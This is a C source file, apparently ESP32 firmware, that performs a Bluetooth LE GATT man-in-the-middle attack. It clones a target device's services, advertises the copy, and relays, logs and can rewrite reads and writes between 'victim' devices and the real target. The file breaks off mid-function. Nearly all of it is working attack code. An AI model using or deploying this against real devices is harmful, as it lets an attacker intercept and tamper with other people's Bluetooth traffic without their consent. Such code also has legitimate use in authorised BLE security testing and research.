#include "LEDStrip.h"
#include "ble/GattAttack.h"
#include "ble/GattAttackApp.h"

extern LEDStrip* leds;
extern GattAttackState gattAttackState;

#define TAG "GATT Attack"

bool shutdown_gatt_attack = false;
int retries = 0;
int MAX_RETRIES = 3;
bool connected = false;
bool connecting = false;
bool clone_init = false; // if the cloned gatt structure has been completed
uint8_t service_num = 0; // number of services found
uint8_t cloned_service_num = 0; // number of cloned services
uint8_t last_end_handle = 0; // used for calculating the # of handles needed
static prepare_type_env_t prepare_write_env;

/* Utils */

/**
 * log_and_send_json
 *
 * Formats messages as JSON and sends via WS.
 *
 * @param char* operation - eg. "WRITE", "READ"
 * @param char* direction - eg. "victim -> target", "cache -> victim"
 * @param char* type - eg. "CHAR", "DESC"
 * @param uint32_t gatt_if - Gatt Interface
 * @param uint32_t conn_id - Connection ID
 * @param uint32_t trans_id - Transaction ID
 * @param uint16_t handle - Connection Handle
 * @param uint32_t status - Status of call
 * @param char* uuid
 * @param char* extra_data - Extra data as string (hex output)
 */
static void log_and_send_json(
  const char *operation, // e.g., "WRITE", "READ"
  const char *direction, // e.g., "victim -> target", "cache -> victim"
  const char *type,      // e.g., "CHAR", "DESC"
  uint32_t gatt_if,
  uint32_t conn_id,
  uint32_t trans_id,
  uint16_t handle,
  uint32_t status,
  const char *uuid,
  const char *extra_data
) {
  cJSON *json = cJSON_CreateObject();
  cJSON_AddStringToObject(json, "operation", operation);
  cJSON_AddStringToObject(json, "direction", direction);
  cJSON_AddStringToObject(json, "type", type);
  cJSON_AddNumberToObject(json, "gatt_if", gatt_if);
  cJSON_AddNumberToObject(json, "conn_id", conn_id);
  cJSON_AddNumberToObject(json, "trans_id", trans_id);
  cJSON_AddNumberToObject(json, "handle", handle);
  cJSON_AddNumberToObject(json, "status", status);
  cJSON_AddStringToObject(json, "uuid", uuid);

  if (extra_data) {
    cJSON_AddStringToObject(json, "data", extra_data);
  }

  char *json_string = cJSON_Print(json);
  if (json_string) {
    send_output(json_string, true);
    free(json_string);
  }

  cJSON_Delete(json);
}

/**
 * bytes_to_hex_string
 *
 * converts a uint8_t data
 * array and returns a char*
 *
 * @param uint8_t* data
 * @param size_t data_len
 * @return char* - hex string
 */
char* bytes_to_hex_string(const uint8_t *data, size_t data_len) {
  // Calculate necessary length for the hex string (2 chars per byte + null terminator)
  size_t hex_string_size = (data_len * 2) + 1;
  char *hex_string = (char*)malloc(hex_string_size);
  
  if (!hex_string) {
    ESP_LOGE(TAG, "Failed to allocate memory for hex string.");
    return NULL;
  }
  
  for (size_t i = 0; i < data_len; ++i) {
    sprintf(&hex_string[i * 2], "%02X", data[i]);
  }
  hex_string[data_len * 2] = '\0';

  return hex_string;
};

uint8_t* hex_string_to_bytes(const char *hex_string, uint16_t *out_len) {
  if (!hex_string || !out_len) {
    return NULL;
  }

  size_t hex_len = strlen(hex_string);

  if (hex_len % 2 != 0) {
    return NULL;
  }

  *out_len = hex_len / 2;
  uint8_t *data = (uint8_t*)malloc(*out_len);
  
  if (!data) {
    ESP_LOGE(TAG, "Failed to allocate memory for byte array.");
    return NULL;
  }

  for (size_t i = 0; i < *out_len; ++i) {
    sscanf(&hex_string[i * 2], "%2hhX", &data[i]);
  }

  return data;
};

/**
 * print_uuid
 *
 * Prints a esp uuid to a char*
 * parameter.
 *
 * @param esp_bt_uuid_t uuid
 * @param char* out
 */
void print_uuid(esp_bt_uuid_t uuid, char* out) {
  switch (uuid.len) {
    case ESP_UUID_LEN_128: {
      snprintf(out, 37,
        "%02x%02x%02x%02x-%02x%02x-%02x%02x-%02x%02x-%02x%02x%02x%02x%02x%02x",
        uuid.uuid.uuid128[15], uuid.uuid.uuid128[14], uuid.uuid.uuid128[13], uuid.uuid.uuid128[12],
        uuid.uuid.uuid128[11], uuid.uuid.uuid128[10], uuid.uuid.uuid128[9], uuid.uuid.uuid128[8],
        uuid.uuid.uuid128[7], uuid.uuid.uuid128[6], uuid.uuid.uuid128[5], uuid.uuid.uuid128[4],
        uuid.uuid.uuid128[3], uuid.uuid.uuid128[2], uuid.uuid.uuid128[1], uuid.uuid.uuid128[0]);
      break;
    }
    case ESP_UUID_LEN_32: {
      sprintf(out, "%" PRIx32, uuid.uuid.uuid32);
      break;
    }
    case ESP_UUID_LEN_16: {
      sprintf(out, "%" PRIx16, uuid.uuid.uuid16);
      break;
    }
    default:
      break;
  }
};

/* Clone Utils */

/**
 * add_services
 *
 * Adds a service to our
 * clone struct.
 *
 * @param service_t* new_service
 */
void add_service(const service_t *new_service) {
  service_t *new_services = (service_t *)realloc(clone.services, (clone.num_services + 1) * sizeof(service_t));
  if (new_services == NULL) {
    return;
  }
  
  clone.services = new_services;
  clone.services[clone.num_services] = *new_service;
  clone.services[clone.num_services].chars = NULL;
  clone.services[clone.num_services].num_chars = 0;
  clone.num_services++;
}

/**
 * add_characteristic
 *
 * Adds a characteristic to a
 * service in our clone struct
 *
 * @param service_t* service
 * @param char_t* new_char
 */
void add_characteristic(service_t *service, const char_t *new_char) {
  char_t *new_chars = (char_t *)realloc(service->chars, (service->num_chars + 1) * sizeof(char_t));
  if (new_chars == NULL) {
    return;
  }

  service->chars = new_chars;
  service->chars[service->num_chars] = *new_char;
  service->chars[service->num_chars].descs = NULL;
  service->chars[service->num_chars].num_descs = 0;
  service->num_chars++;
}

/**
 * add_descriptor
 *
 * Adds a descriptor to a characteristic
 * in our clone struct
 *
 * @param char_t* character
 * @param desc_t* new_desc
 */
void add_descriptor(char_t *character, const desc_t *new_desc) {
  desc_t *new_descs = (desc_t *)realloc(character->descs, (character->num_descs + 1) * sizeof(desc_t));
  if (new_descs == NULL) {
    return;
  }

  character->descs = new_descs;
  character->descs[character->num_descs] = *new_desc;
  character->num_descs++;
}

/**
 * free_clone
 *
 * Free's our clone struct
 * and sets it to an init
 * state.
 */
void free_clone() {
  for (size_t i = 0; i < clone.num_services; i++) {
    // Free all characteristics and their descriptors
    for (size_t j = 0; clone.services[i].chars != NULL && clone.services[i].chars[j].descs != NULL; j++) {
      free(clone.services[i].chars[j].descs);
    }
    free(clone.services[i].chars);
  }
  
  free(clone.services);

  clone.services = NULL;
  clone.num_services = 0;
}

/**
 * get_desc_parent_char_handle
 *
 * Returns the handle for the given
 * descriptor's parent characteristic.
 *
 * @param uint16_t handle - for desc
 * @return uint16_t handle - for parent char
 */
uint16_t get_desc_parent_char_handle(uint16_t desc_handle) {
  for (int x = 0; x < clone.num_services; x++) {
    for (int y = 0; y < clone.services[x].num_chars; y++) {
      for (int z = 0; z < clone.services[x].chars[y].num_descs; z++) {
        if (clone.services[x].chars[y].descs[z].desc_handle == desc_handle) {
          return clone.services[x].chars[y].char_handle;
        }
      }
    }
  }

  return 0x01;
};

/**
 * handle_is_descriptor
 *
 * Determines if the input handle
 * is a descriptor or not using our
 * clone struct
 *
 * @param uint16_t handle
 * @return bool
 */
bool handle_is_descriptor(uint16_t handle) {
  for (int x = 0; x < clone.num_services; x++) {
    for (int y = 0; y < clone.services[x].num_chars; y++) {
      if (clone.services[x].chars[y].char_handle == handle) {
        return false;
      } else {
        for (int z = 0; z < clone.services[x].chars[y].num_descs; z++) {
          if (clone.services[x].chars[y].descs[z].desc_handle == handle) {
            return true;
          }
        }
      }
    }
  }

  return false;
};

/**
 * get_uuid_for_handle
 *
 * Sets out variable to string
 * of the UUID give the handle
 *
 * @param uint16_t handle
 * @param char* out
 */
void get_uuid_for_handle(uint16_t handle, char* out) {
  for (int x = 0; x < clone.num_services; x++) {
    if (clone.services[x].service_handle == handle) {
      esp_bt_uuid_t uuid = clone.services[x].service_uuid;
      return print_uuid(uuid, out);
    }
    for (int y = 0; y < clone.services[x].num_chars; y++) {
      if (clone.services[x].chars[y].char_handle == handle) {
        esp_bt_uuid_t uuid = clone.services[x].chars[y].char_uuid;
        return print_uuid(uuid, out);
      } else {
        for (int z = 0; z < clone.services[x].chars[y].num_descs; z++) {
          if (clone.services[x].chars[y].descs[z].desc_handle == handle) {
            esp_bt_uuid_t uuid = clone.services[x].chars[y].descs[z].desc_uuid;
            return print_uuid(uuid, out);
          }
        }
      }
    }
  }
};

/**
 * prep_write_event_env
 *
 * Handles a PREP Write to
 * either a char or desc. It
 * will copy the bytes into
 * our prepared_write_env
 * variable. Then it will
 * send our attacking client
 * to send the same write.
 *
 * Called from ESP_GATTS_WRITE_EVT
 * when it is a prepped write.
 *
 * @param esp_ble_gatts_cb_param_t *param
 */
void prep_write_event_env(esp_ble_gatts_cb_param_t *param){
  char uuid[38];
  bool isDescriptor = handle_is_descriptor(param->write.handle);
  get_uuid_for_handle(param->write.handle, uuid);
  esp_gatt_status_t status = ESP_GATT_OK;

  char* value = bytes_to_hex_string(param->write.value, param->write.len);

  log_and_send_json(
    "PREP WRITE",
    connected ? "victim -> target" : "victim -> cache",
    isDescriptor ? "DESC" : "CHAR",
    clone.gattc_if,
    clone.target_client_conn_id,
    param->write.trans_id,
    param->write.handle,
    0,
    uuid,
    value
  );

  free(value);

  if (connected) {
    if (!isDescriptor) {
      esp_ble_gattc_prepare_write(clone.gattc_if,
                                  clone.target_client_conn_id,
                                  param->write.handle,
                                  param->write.offset,
                                  param->write.len,
                                  param->write.value,
                                  ESP_GATT_AUTH_REQ_NONE);
    } else {
      esp_ble_gattc_prepare_write_char_descr(clone.gattc_if,
                                            clone.target_client_conn_id,
                                            param->write.handle,
                                            param->write.offset,
                                            param->write.len,
                                            param->write.value,
                                            ESP_GATT_AUTH_REQ_NONE);
    }
  }

  if (prepare_write_env.prepare_buf == NULL) {
    prepare_write_env.prepare_buf = (uint8_t *)malloc(2048*sizeof(uint8_t));
    prepare_write_env.prepare_len = 0;
    if (prepare_write_env.prepare_buf == NULL) {
      ESP_LOGE(TAG, "Gatt_server prep no mem");
      status = ESP_GATT_NO_RESOURCES;
    }
  }

  esp_gatt_rsp_t *gatt_rsp = (esp_gatt_rsp_t *)malloc(sizeof(esp_gatt_rsp_t));
  if (gatt_rsp) {
    gatt_rsp->attr_value.len = param->write.len;
    gatt_rsp->attr_value.handle = param->write.handle;
    gatt_rsp->attr_value.offset = param->write.offset;
    gatt_rsp->attr_value.auth_req = ESP_GATT_AUTH_REQ_NONE;
    memcpy(gatt_rsp->attr_value.value, param->write.value, param->write.len);
    esp_ble_gatts_send_response(clone.gatts_if,
                                param->write.conn_id,
                                param->write.trans_id,
                                status, gatt_rsp);
    free(gatt_rsp);
  }

  /**
   * Im not quite sure if offset is 0 
   * we need to overwrite or append to
   * our prepare_buf. Right now I am
   * going to just overwrite it.
   *
   * Using nRF Connect I have been unable
   * to see the Reliable Write ever do
   * anything other than offset 0.
   */
  memcpy(prepare_write_env.prepare_buf + param->write.offset,
        param->write.value,
        param->write.len);
  
  if (param->write.offset == 0) {
    prepare_write_env.prepare_len = 0;
  } 
  else {
    prepare_write_env.prepare_len += param->write.len;
  }
}

/**
 * server_event
 *
 * Handles the GATT Server
 * events. This is what actually
 * is the copy of the target device
 * and handles connections from
 * victims devices.
 *
 * @param esp_gatts_cb_event_t event
 * @param esp_gatt_if_t gatts_if
 * @param esp_ble_gatts_cb_param_t *param
 */
void server_event(esp_gatts_cb_event_t event, esp_gatt_if_t gatts_if, esp_ble_gatts_cb_param_t *param) {
  switch (event) {
    case ESP_GATTS_REG_EVT: {
      /**
       * Once we the client has received
       * all services from the target
       * device we start up our gatt
       * server.
       *
       * Here we create a service for each
       * one found in our clone struct.
       */
      clone.gatts_if = gatts_if;

      char send[18];
      snprintf(send, 18, "GOT %i SERVICES", (int)clone.num_services);
      send_output(send, false);

      for (size_t i = 0; i < clone.num_services; i++) {
        // calculate # of handles
        uint8_t total = 0;

        if ((i+1) <= clone.num_services) {
          total = clone.services[i].end_handle - clone.services[i].start_handle;
          total += clone.services[i+1].start_handle - clone.services[i].end_handle;
        }

        esp_gatt_srvc_id_t service;
        service.is_primary = true;
        service.id.inst_id = 0x00;
        
        if (clone.services[i].service_uuid.len == ESP_UUID_LEN_16) {
          service.id.uuid.len = ESP_UUID_LEN_16;
          service.id.uuid.uuid.uuid16 = clone.services[i].service_uuid.uuid.uuid16;
        } else if (clone.services[i].service_uuid.len == ESP_UUID_LEN_32) {
          service.id.uuid.len = ESP_UUID_LEN_32;
          service.id.uuid.uuid.uuid32 = clone.services[i].service_uuid.uuid.uuid32;
        } else {
          service.id.uuid.len = ESP_UUID_LEN_128;
          memcpy(service.id.uuid.uuid.uuid128, clone.services[i].service_uuid.uuid.uuid128, 16);
        }

        esp_err_t ret = esp_ble_gatts_create_service(gatts_if, &service, total);
        if (ret != ESP_OK) {
          ESP_LOGI(TAG, "create service failed: %s", esp_err_to_name(ret));
        }
      }
      
      break;
    }
    case ESP_GATTS_READ_EVT: { 
      /**
       * When a victim sends a read
       * event to a target device
       *
       * We log the information and read
       * from the real target device.
       *
       * The response is handled in the client.
       * ESP_GATTC_WRITE_EVT
       */
      char uuid[38];
      bool isDescriptor = handle_is_descriptor(param->read.handle);
      clone.server_conn_id = param->read.conn_id;
      clone.server_trans_id = param->read.trans_id;
      get_uuid_for_handle(param->read.handle, uuid);

      log_and_send_json(
        "READ",
        connected ? "victim -> target" : "victim -> cache",
        isDescriptor ? "DESC" : "CHAR",
        clone.gattc_if,
        clone.target_client_conn_id,
        param->read.trans_id,
        param->read.handle,
        0,
        uuid,
        NULL
      );
      
      if (connected) {
        if (!isDescriptor) {
          esp_ble_gattc_read_char(clone.gattc_if,
                                clone.target_client_conn_id,
                                param->read.handle,
                                ESP_GATT_AUTH_REQ_NONE);
        } else {
          esp_ble_gattc_read_char_descr(clone.gattc_if,
                                        clone.target_client_conn_id,
                                        param->read.handle,
                                        ESP_GATT_AUTH_REQ_NONE);
        }
      } else {
        esp_gatt_rsp_t rsp;
        memset(&rsp, 0, sizeof(esp_gatt_rsp_t));
        rsp.attr_value.handle = param->read.handle;
        uint8_t* value = NULL;
        bool found = false;
        
        for (int x = 0; x < clone.num_services; x++) {
          for (int y = 0; y < clone.services[x].num_chars; y++) {
            if (clone.services[x].chars[y].char_handle == param->read.handle) {
              rsp.attr_value.len = clone.services[x].chars[y].value.attr_len;
              value = (uint8_t*)realloc(value, rsp.attr_value.len);
              memcpy(value, clone.services[x].chars[y].value.attr_value, rsp.attr_value.len);
              found = true;
              goto after_find_read;
            } else {
              for (int z = 0; z < clone.services[x].chars[y].num_descs; z++) {
                if (clone.services[x].chars[y].descs[z].desc_handle == param->read.handle) {
                  rsp.attr_value.len = clone.services[x].chars[y].descs[z].value.attr_len;
                  value = (uint8_t*)realloc(value, rsp.attr_value.len);
                  memcpy(value, clone.services[x].chars[y].descs[z].value.attr_value, rsp.attr_value.len);
                  found = true;
                  goto after_find_read;
                }
              }
            }
          }
        }

after_find_read:
        if (!found || rsp.attr_value.len == 0) {
          rsp.attr_value.len = 1;
          value = (uint8_t*)realloc(value, rsp.attr_value.len);
          value[0] = 0x01;
        }

        char* hexVal = bytes_to_hex_string(value, rsp.attr_value.len);

        memcpy(rsp.attr_value.value, value, rsp.attr_value.len);
        free(value);
        esp_ble_gatts_send_response(clone.gatts_if,
                                    clone.server_conn_id,
                                    clone.server_trans_id,
                                    ESP_GATT_OK, &rsp);

        log_and_send_json(
          "READ RSP",
          "cache -> victim",
          isDescriptor ? "DESC" : "CHAR",
          clone.gattc_if,
          clone.target_client_conn_id,
          param->read.trans_id,
          param->read.handle,
          0,
          uuid,
          hexVal
        );

        free(hexVal);
      }

      break;
    }
    case ESP_GATTS_WRITE_EVT: {
      /**
       * When a victim sends a write
       * event to a target device
       *
       * We run hooks, log the information
       * and write it to the real target
       * device.
       *
       * The response is handled in the client.
       */
      int outSize = 300 + param->write.len;
      char out[outSize];
      char uuid[38];
      bool isDescriptor = handle_is_descriptor(param->write.handle);
      uint16_t write_len = param->write.len;
      uint8_t *write_value = (uint8_t*)malloc(write_len);
      memcpy(write_value, param->write.value, write_len);
      clone.server_conn_id = param->write.conn_id;
      clone.server_trans_id = param->write.trans_id;
      clone.server_last_write_needs_rsp = param->write.need_rsp;
      get_uuid_for_handle(param->write.handle, uuid);

      esp_gatt_write_type_t write_type = param->write.need_rsp 
        ? ESP_GATT_WRITE_TYPE_RSP
        : ESP_GATT_WRITE_TYPE_NO_RSP;

      if (param->write.is_prep) {
        prep_write_event_env(param);
        break;
      }

      // Handle Descriptor Notfiy/Indicate
      if (isDescriptor && param->write.len == 2) {
        /*
         * We need to enabled the notification for the PARENT
         * characterics, not this desc handle..
         */
        uint16_t notification_target_handle = get_desc_parent_char_handle(param->write.handle);
        uint16_t bit_value = param->write.value[1]<<8 | param->write.value[0];

        if (bit_value == 0x0001) {
          sprintf(out, "Notifiy Enabled - handle: 0x%02x uuid: %s",
                  notification_target_handle, uuid);
          send_output(out, false);

          esp_err_t ret = esp_ble_gattc_register_for_notify(clone.gattc_if,
                                                            clone.target_bda,
                                                            notification_target_handle);

          if (ret != ESP_OK) {
            ESP_LOGI(TAG, "Error gattc_register_for_notify: %s", esp_err_to_name(ret));
          }
        } else if (bit_value == 0x0002) {
          sprintf(out, "Indicate Enabled - handle: 0x%02x uuid: %s",
                  notification_target_handle, uuid);
          send_output(out, false);

          esp_err_t ret = esp_ble_gattc_register_for_notify(clone.gattc_if,
                                                            clone.target_bda,
                                                            notification_target_handle);
        }
        else if (bit_value == 0x0000) {
          sprintf(out, "Notifiy/Indicate Disabled - handle: 0x%02x uuid: %s",
                  notification_target_handle, uuid);
          send_output(out, false);

          esp_err_t ret = esp_ble_gattc_unregister_for_notify(clone.gattc_if,
                                                              clone.target_bda,
                                                              notification_target_handle);

          if (ret != ESP_OK) {
            ESP_LOGI(TAG, "Error gattc_unregister_for_notify: %s", esp_err_to_name(ret));
          } else {
            sprintf(out, "Unregistered Notfication/Indicate - handle: 0x%02x uuid: %s",
                    notification_target_handle, uuid);
            send_output(out, false);
          }
        }
      }

      char* hex_value = bytes_to_hex_string(param->write.value, param->write.len);
      if (should_run_hooks()) {
        char *new_value = run_hook("write", uuid, hex_value);
        if (new_value) {
          free(hex_value);
          hex_value = new_value;

          uint8_t *new_bytes = hex_string_to_bytes(hex_value, &write_len);

          free(write_value);
          write_value = (uint8_t*)malloc((size_t)write_len);
          if (!write_value) {
            ESP_LOGE(TAG, "Failed to allocate memory for write_value");
            free(new_bytes);
            return;
          }

          memcpy(write_value, new_bytes, write_len);
          free(new_bytes);
        }
      }

      log_and_send_json(
        "WRITE",
        connected ? "victim -> target" : "victim -> cache",
        isDescriptor ? "DESC" : "CHAR",
        clone.gattc_if,
        clone.target_client_conn_id,
        param->write.trans_id,
        param->write.handle,
        0,
        uuid,
        hex_value
      );

      if (connected) {
        esp_err_t status;

        if (isDescriptor) {
          status = esp_ble_gattc_write_char_descr(clone.gattc_if,
                                                  clone.target_client_conn_id,
                                                  param->write.handle,
                                                  write_len,
                                                  write_value,
                                                  write_type,
                                                  ESP_GATT_AUTH_REQ_NONE);
        } else {
          status = esp_ble_gattc_write_char(clone.gattc_if,
                                            clone.target_client_conn_id,
                                            param->write.handle,
                                            write_len,
                                            write_value,
                                            write_type,
                                            ESP_GATT_AUTH_REQ_NONE
                                            );
        }

        if (status != ESP_GATT_OK) {
          ESP_LOGE(TAG, "esp_ble_gattc_write error %s", esp_err_to_name(status));
        }
      }

      free(hex_value);

      // Write to cache
      for (int x = 0; x < clone.num_services; x++) {
        for (int y = 0; y < clone.services[x].num_chars; y++) {
          if (clone.services[x].chars[y].char_handle == param->write.handle) {
            clone.services[x].chars[y].value.attr_len = write_len;
            if (clone.services[x].chars[y].value.attr_value != NULL) {
              free(clone.services[x].chars[y].value.attr_value);
              clone.services[x].chars[y].value.attr_value = NULL;
            }
            clone.services[x].chars[y].value.attr_value = (uint8_t*)malloc(write_len);
            memcpy(clone.services[x].chars[y].value.attr_value, write_value, write_len);
            goto after_find_write;
          } else {
            for (int z = 0; z < clone.services[x].chars[y].num_descs; z++) {
              if (clone.services[x].chars[y].descs[z].desc_handle == param->write.handle) {
                clone.services[x].chars[y].descs[z].value.attr_len = write_len;
                if (clone.services[x].chars[y].descs[z].value.attr_value != NULL) {
                  free(clone.services[x].chars[y].descs[z].value.attr_value);
                  clone.services[x].chars[y].descs[z].value.attr_value = NULL;
                }
                clone.services[x].chars[y].descs[z].value.attr_value = (uint8_t*)malloc(write_len);
                memcpy(clone.services[x].chars[y].descs[z].value.attr_value, write_value, write_len);
                goto after_find_write;
              }
            }
          }
        }
      }

after_find_write:
      if (param->write.need_rsp) {
          // Send rsp directly to victim instead of waiting for real rsp from target
          esp_gatt_rsp_t rsp;
          memset(&rsp, 0, sizeof(esp_gatt_rsp_t));
          rsp.attr_value.handle = param->write.handle;

          esp_ble_gatts_send_response(clone.gatts_if,
                                      clone.server_conn_id,
                                      clone.server_trans_id,
                                      ESP_GATT_OK, &rsp);

          log_and_send_json(
            "WRITE RSP",
            "cache -> victim",
            isDescriptor ? "DESC" : "CHAR",
            gatts_if,
            clone.server_conn_id,
            clone.server_trans_id,
            param->write.handle,
            0,
            uuid,
            NULL
          );
        }

      break;
    }
    case ESP_GATTS_EXEC_WRITE_EVT: {
      /**
       * This event comes when the
       * victim sends the exec write
       * or abort.
       *
       * This ends up logging the
       * prepared buffer and then
       * executing the write on
       * the attacking client.
       */
      bool execute = false;
      esp_ble_gatts_send_response(gatts_if, param->write.conn_id, param->write.trans_id, ESP_GATT_OK, NULL);

      if (param->exec_write.exec_write_flag == ESP_GATT_PREP_WRITE_EXEC) {
        execute = true;
      }

      char* value = bytes_to_hex_string(prepare_write_env.prepare_buf, prepare_write_env.prepare_len);
      log_and_send_json(
        execute ? "EXEC WRITE" : "ABORT WRITE",
        connected ? "victim -> target" : "victim -> cache",
        "",
        clone.gatts_if,
        param->exec_write.conn_id,
        param->exec_write.trans_id,
        0,
        0,
        NULL,
        execute ? value : ""
      );

      esp_ble_gattc_execute_write(clone.gattc_if,
                                  param->exec_write.conn_id,
                                  execute);

      if (prepare_write_env.prepare_buf != NULL) {
        free(prepare_write_env.prepare_buf);
        prepare_write_env.prepare_buf = NULL;
      }

      prepare_write_env.prepare_len = 0;
      break;
    }
    case ESP_GATTS_CREATE_EVT: {
      /**
       * When the Service is registered, we
       * need to add characteristics and their
       * descriptors.
       */
      for (size_t i = 0; i < clone.num_services; i++) {
        bool matches = false;
        if (clone.services[i].service_uuid.len == ESP_UUID_LEN_16) {
          matches = (clone.services[i].service_uuid.uuid.uuid16 == param->create.service_id.id.uuid.uuid.uuid16);
        } else if (clone.services[i].service_uuid.len == ESP_UUID_LEN_32) {
          matches = (clone.services[i].service_uuid.uuid.uuid32 == param->create.service_id.id.uuid.uuid.uuid32);
        } else {
          matches = (memcmp(clone.services[i].service_uuid.uuid.uuid128, param->create.service_id.id.uuid.uuid.uuid128, 16) == 0);
        }

        if (matches) {
          clone.services[i].service_id = param->create.service_id;
          for (size_t x = 0; x < clone.services[i].num_chars; x++) {
            esp_err_t add_char_ret = esp_ble_gatts_add_char(param->create.service_handle,
                                                          &clone.services[i].chars[x].char_uuid,
                                                          ESP_GATT_PERM_READ | ESP_GATT_PERM_WRITE,
                                                          clone.services[i].chars[x].property,
                                                          &clone.services[i].chars[x].value,
                                                          NULL);
            if (add_char_ret != ESP_GATT_OK) {
              ESP_LOGE(TAG, "add_char_ret %s", esp_err_to_name(add_char_ret));
            }

            for (size_t y = 0; y < clone.services[i].chars[x].num_descs; y++) {
              esp_err_t add_desc_ret = esp_ble_gatts_add_char_descr(param->create.service_handle,
                                                                  &clone.services[i].chars[x].descs[y].desc_uuid,
                                                                  ESP_GATT_PERM_READ | ESP_GATT_PERM_WRITE,
                                                                  &clone.services[i].chars[x].descs[y].value,
                                                                  NULL);
              if (add_desc_ret != ESP_GATT_OK) {
                ESP_LOGE(TAG, "add_desc_ret %s", esp_err_to_name(add_char_ret));
              }
              
            }
          }
        }
      }

      esp_err_t ret = esp_ble_gatts_start_service(param->create.service_handle);
      if (ret != ESP_OK) {
        ESP_LOGI(TAG, "start service err: %s", esp_err_to_name(ret));
      }
      break;
    }
    case ESP_GATTS_START_EVT: {   
      /**
       * When the GATT service is started
       * after successfully creating the
       * service and starting it inside
       * ESP_GATTS_CREATE_EVT.
       *
       * We check that we have our expected
       * amount of cloned services and start
       * advertising when we do.
       */
      cloned_service_num++;

      if (cloned_service_num >= clone.num_services) {
        send_output("GATT Clone Success", false);
        gattAttackState = GATT_ATTACK_STATE_RUNNING;
        GattAttackApp::sendState((int)gattAttackState);
        esp_ble_gap_start_advertising(&adv_params);
        leds->blink(0, 0, 255);
      }

      break;
    }
    case ESP_GATTS_CONNECT_EVT: {
      /**
       * Called when a client (victim) is
       * connected to our gatt server.
       *
       * We set connection parameters and
       * determine if the target device has
       * established a gatt connection.
       */
      esp_ble_conn_update_params_t conn_params = {0};
      memcpy(conn_params.bda, param->connect.remote_bda, sizeof(esp_bd_addr_t));

      /* For the IOS system, please reference the apple official documents about the ble connection parameters restrictions. */
      conn_params.latency = 0;
      conn_params.max_int = 0x20;    // max_int = 0x20*1.25ms = 40ms
      conn_params.min_int = 0x10;    // min_int = 0x10*1.25ms = 20ms
      conn_params.timeout = 400;    // timeout = 400*10ms = 4000ms
      ESP_LOGI(TAG, "ESP_GATTS_CONNECT_EVT, conn_id %d, remote %02x:%02x:%02x:%02x:%02x:%02x:",
              param->connect.conn_id,
              param->connect.remote_bda[0], param->connect.remote_bda[1], param->connect.remote_bda[2],
              param->connect.remote_bda[3], param->connect.remote_bda[4], param->connect.remote_bda[5]);
      
      if (memcmp(clone.target_bda, param->connect.remote_bda, sizeof(clone.target_bda)) == 0) {
        send_output("TARGET DEVICE HAS CONNECTED TO OUR GATTS", false);
        clone.server_conn_id = param->connect.conn_id;
      }

      // update connection parameters for the peer device.
      esp_ble_gap_update_conn_params(&conn_params);
      break;
    }
    case ESP_GATTS_DISCONNECT_EVT: {
      /**
       * Called when a victim is disconnected
       */
      ESP_LOGI(TAG, "ESP_GATTS_DISCONNECT_EVT, disconnect reason 0x%x conn_id: %x - %02x:%02x:%02x:%02x:%02x:%02x:",
              param->disconnect.reason,
              param->disconnect.conn_id,
              param->disconnect.remote_bda[0], param->disconnect.remote_bda[1], param->disconnect.remote_bda[2],
              param->disconnect.remote_bda[3], param->disconnect.remote_bda[4], param->disconnect.remote_bda[5]);
      esp_ble_gap_start_advertising(&adv_params);
      break;
    }
    case ESP_GATTS_CONF_EVT: {
      /**
       * I believe this is called
       * after a successful notify/indicate
       * is sent.
       */
      if (param->conf.status != ESP_GATT_OK) {
        ESP_LOGI(TAG, "ESP_GATTS_CONF_EVT failed: status %d attr_handle %x", param->conf.status, param->conf.handle);
        esp_log_buffer_hex(TAG, param->conf.value, param->conf.len);
      }
      break;
    }
    case ESP_GATTS_MTU_EVT: {
      ESP_LOGI(TAG, "ESP_GATTS_MTU_EVT, MTU %d", param->mtu.mtu);
      esp_ble_gatt_set_local_mtu(param->mtu.mtu);
      esp_ble_gattc_send_mtu_req(clone.gattc_if, param->mtu.conn_id);
      break;
    }
    default:
      break;
  }
};

/**
 * client_event
 *
 * Handles the GATT Client
 * events. This is our fake
 * connection to the target
 * device that discovers the
 * services, clones them, and
 * then start the GATT Server.
 *
 * The connection tries to stay
 * open for a number of attempts
 * to and actions as a MITM device.
 *
 * @param esp_gattc_cb_event_t event
 * @param esp_gatt_if_t gattc_if
 * @param esp_ble_gattc_cb_param_t *param
 */
void client_event(esp_gattc_cb_event_t event, esp_gatt_if_t gattc_if, esp_ble_gattc_cb_param_t *param) {
  switch (event) {
    case ESP_GATTC_REG_EVT: {
      /**
       * After our attacking
       * client is created we
       * need to set our clone
       * interface and begin
       * scanning for our
       * target device.
       */
      clone.gattc_if = gattc_if;
      clone.services = NULL;
      clone.num_services = 0;

      esp_err_t scan_ret = esp_ble_gap_set_scan_params(&ble_scan_params);
      if (scan_ret) {
        ESP_LOGE(TAG, "set scan params error, error code = %x", scan_ret);
      }

      break;
    }
    case ESP_GATTC_CONNECT_EVT: {
      /**
       * Occurs whenever a physical
       * BLE connection is established.
       *
       * It can either be a victim device
       * or the same device connecting back
       * to us in some cases (that might not
       * be handled)
       *
       * We also do a MTU request here.
       */
      ESP_LOGI(TAG, "Connection:");
      esp_log_buffer_hex(TAG, param->connect.remote_bda, sizeof(esp_bd_addr_t));
      
      if (memcmp(clone.target_bda, param->connect.remote_bda, sizeof(clone.target_bda)) == 0) {
        connected = true;
        connecting = false;
        send_output("Target Device Client Connected.", false);
        gattAttackState = GATT_ATTACK_STATE_CLIENT_CONNECTED;
        GattAttackApp::sendState((int)gattAttackState);
        clone.target_client_conn_id = param->connect.conn_id;
        leds->blink(0, 0, 255);
      } else {
        send_output("Victim Device Connected", false);
        clone.victim_client_conn_id = param->connect.conn_id;
        leds->blink(255, 0, 0);
      }

      esp_err_t mtu_ret = esp_ble_gattc_send_mtu_req(gattc_if, param->connect.conn_id);
      if (mtu_ret) {
        ESP_LOGE(TAG, "config MTU error, error code = %x", mtu_ret);
      }
      break;
    }
    case ESP_GATTC_DISCONNECT_EVT: {
      /**
       * This event comes when either
       * our victim or attacking client
       * is disconnected.
       *
       * If it is our attacking client
       * we attempt to reconnecting
       * up the the MAX_ATTEMPTS.
       */
      ESP_LOGI(TAG, "ESP_GATTC_DISCONNECT_EVT, disconnect reason 0x%x (%i) conn_id: %x - %02x:%02x:%02x:%02x:%02x:%02x:",
              param->disconnect.reason, param->disconnect.reason,
              param->disconnect.conn_id,
              param->disconnect.remote_bda[0], param->disconnect.remote_bda[1], param->disconnect.remote_bda[2],
              param->disconnect.remote_bda[3], param->disconnect.remote_bda[4], param->disconnect.remote_bda[5]);

      /**
       * If disconnect is the bda of our
       * upstream device, reconnect
       */
